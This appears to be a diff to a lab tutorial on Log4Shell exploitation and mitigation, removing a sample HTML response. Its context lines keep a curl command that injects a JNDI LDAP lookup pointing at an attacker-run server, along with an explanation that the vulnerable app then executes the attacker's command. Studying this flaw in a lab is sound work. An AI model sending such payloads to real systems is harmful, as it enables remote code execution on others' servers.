@@ -52,11 +52,6 @@ Now, we just need to call the app and introduce the malicious ldap server endpoi
 
 $ curl localhost:9090 -H 'Hack: ${jndi:ldap://192.168.86.220:1389/vqwfzl}'
 ```
-This will bring the same html message that is rendered in the browser
-
-```bash
-  <h1 style="color: #5e9ca0;">Log4Shell</h1><h4>Vulnerability - Exploitation and Mitigation</h4><p>API Version: 1.0</p>
-```
 
 At this point the vulnerable app, logged all the headers using the vulnerable version of log4j and triggered the ldap server that is running under the exploitation tool which ultimately executed the given command.
 
